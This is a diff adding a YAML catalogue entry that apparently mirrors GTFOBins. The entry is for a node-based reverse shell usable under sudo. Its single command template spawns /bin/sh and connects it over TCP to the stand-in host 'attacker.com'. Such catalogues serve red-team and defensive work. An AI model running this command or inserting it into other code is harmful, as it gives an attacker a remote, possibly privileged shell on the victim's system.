@@ -1,0 +1,27 @@
+id: gtfobins/node/reverse-shell/sudo
+type: binary
+platform: linux
+name: node
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- reverse-shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(12345,\
+    \ \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n\
+    })'"
+references:
+- https://gtfobins.github.io/gtfobins/node/
+tags:
+- linux
+- unix
+- gtfobins
